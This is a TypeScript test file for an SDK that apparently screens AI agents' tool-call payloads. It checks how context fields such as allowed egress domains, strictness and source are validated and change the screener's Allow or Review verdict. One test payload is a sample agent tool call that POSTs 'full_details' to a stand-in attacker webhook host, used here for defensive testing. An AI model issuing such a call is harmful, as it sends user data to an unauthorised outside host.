import { test } from "node:test";
import assert from "node:assert/strict";

import { SurfaceClient, ValidationError, type ActionContext } from "../src/index.js";

function resp(threatLevel: string, recommendedAction: string) {
  return {
    name: "payload.json",
    size: 10,
    hash: "abc",
    contentType: "application/json",
    safetyScore: {
      score: 5,
      threatLevel,
      confidence: "High",
      confidenceScore: 0.9,
      confidenceReason: "",
      primaryThreat: "",
      threatSummary: "",
      enginesUsed: [],
      recommendedAction,
      coverage: "partial",
    },
    scanTimeMs: 1,
    timestamp: 0,
  };
}

/** A client whose fetch verdict depends on the request body it receives. */
function verdictClient(opts: { strictness?: ActionContext["strictness"] } = {}): { client: SurfaceClient; lastBody: () => any } {
  let body: any = {};
  const fetchImpl = (async (_url: string, init?: RequestInit) => {
    body = JSON.parse(String(init?.body ?? "{}"));
    // Model the screener: egress to a host outside a declared allowed_egress is
    // Review; with no context to judge "outside", it is Allow.
    const egress: string[] = body.context?.allowed_egress ?? [];
    const undeclared = egress.length > 0 && !egress.includes("webhook.attacker-collect.io");
    return new Response(JSON.stringify(undeclared ? resp("Suspicious", "Review") : resp("Clean", "Allow")), {
      status: 200,
      headers: { "content-type": "application/json" },
    });
  }) as unknown as typeof globalThis.fetch;
  const client = new SurfaceClient({ apiKey: "sfk_test", fetch: fetchImpl, ...opts });
  return { client, lastBody: () => body };
}

test("scanPayload forwards context in the request body", async () => {
  const { client, lastBody } = verdictClient();
  const context: ActionContext = {
    principal_domains: ["acme.io"],
    allowed_egress: ["api.stripe.com", "hooks.slack.com"],
    user_request: "summarize this week's tickets",
  };
  await client.scanPayload('{"tool":"http_request","args":{"method":"POST","url":"https://api.stripe.com/v1/charges"}}', "p.json", { context });
  const ctx = lastBody().context;
  assert.ok(ctx, "context missing from body");
  assert.equal(ctx.user_request, "summarize this week's tickets");
  assert.deepEqual(ctx.allowed_egress, ["api.stripe.com", "hooks.slack.com"]);
  assert.equal("known_payees" in ctx, false);
});

test("scanPayload omits context when not supplied", async () => {
  const { client, lastBody } = verdictClient();
  await client.scanPayload("hello", "x");
  assert.equal("context" in lastBody(), false);
});

test("scanPayload accepts a partial context", async () => {
  const { client, lastBody } = verdictClient();
  await client.scanPayload("hello", "x", { context: { user_request: "summarize tickets" } });
  assert.deepEqual(lastBody().context, { user_request: "summarize tickets" });
});

test("scanPayload rejects a string where a list is required", async () => {
  const { client } = verdictClient();
  await assert.rejects(
    () => client.scanPayload("hello", "x", {
      context: { principal_domains: "acme.io" } as unknown as ActionContext,
    }),
    /array|Expected/i,
  );
});

test("context flips an egress verdict Allow<->Review through the SDK", async () => {
  const payload = '{"tool":"http_request","args":{"method":"POST","url":"https://webhook.attacker-collect.io/i","body":{"full_details":true}}}';

  const c1 = verdictClient();
  const withCtx = await c1.client.scanPayload(payload, "p.json", {
    context: { principal_domains: ["acme.io"], allowed_egress: ["api.stripe.com"] },
  });
  assert.equal((withCtx as any).safetyScore.recommendedAction, "Review");

  const c2 = verdictClient();
  const without = await c2.client.scanPayload(payload, "p.json");
  assert.equal((without as any).safetyScore.recommendedAction, "Allow");
});

test("strictness is validated and sent in the payload context", async () => {
  for (const level of ["relaxed", "balanced", "strict"] as const) {
    const { client, lastBody } = verdictClient();
    await client.scanPayload("{}", "x", { context: { principal_domains: ["acme.io"], strictness: level } });
    assert.deepEqual(lastBody().context, { principal_domains: ["acme.io"], strictness: level });
  }
  for (const bad of ["Strict", "stirct", "high", 1]) {
    const { client } = verdictClient();
    await assert.rejects(
      () => client.scanPayload("{}", "x", { context: { strictness: bad } as unknown as ActionContext }),
      (e: unknown) => e instanceof ValidationError,
    );
  }
});

test("client strictness fills the context only where it is unset", async () => {
  const { client, lastBody } = verdictClient({ strictness: "strict" });
  await client.scanPayload("{}", "a.json");
  assert.deepEqual(lastBody().context, { strictness: "strict" });
  await client.scanPayload("{}", "b.json", { context: { principal_domains: ["acme.io"] } });
  assert.deepEqual(lastBody().context, { principal_domains: ["acme.io"], strictness: "strict" });
  await client.scanPayload("{}", "c.json", { context: { strictness: "relaxed" } });
  assert.deepEqual(lastBody().context, { strictness: "relaxed" });
});

test("invalid client strictness throws at construction", () => {
  assert.throws(
    () => new SurfaceClient({ apiKey: "sfk_test", strictness: "high" as never }),
    (e: unknown) => e instanceof ValidationError,
  );
});

test("source and personal_mail_expected are validated and sent", async () => {
  for (const source of ["user_prompt", "content", "tool_call"] as const) {
    const { client, lastBody } = verdictClient();
    await client.scanPayload("hi", "x", { context: { source, personal_mail_expected: true } });
    assert.deepEqual(lastBody().context, { source, personal_mail_expected: true });
  }
  for (const bad of [{ source: "prompt" }, { personal_mail_expected: "yes" }]) {
    const { client } = verdictClient();
    await assert.rejects(
      () => client.scanPayload("hi", "x", { context: bad as unknown as ActionContext }),
      (e: unknown) => e instanceof ValidationError,
    );
  }
});
